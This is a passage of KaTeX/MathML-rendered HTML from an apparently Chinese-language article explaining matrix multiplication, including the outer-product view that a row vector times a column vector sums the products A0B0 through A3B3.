style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,1209c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-1344c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>另一种则是不那么直观的矩阵乘外积方法：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>0</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>0</mn></msub><mo>+</mo><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>1</mn></msub><mo>+</mo><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>2</mn></msub><mo>+</mo><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\begin{pmatrix}A_0 &amp; A_1 &amp; A_2 &amp; A_3\end{pmatrix}\begin{pmatrix}B_0 \\B_1 \\B_2 \\B_3\end{pmatrix}=A_0 B_0 + A_1 B_1 + A_2 B_2 + A_3 B_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,1284c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-1292c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,1209c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-1344c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord 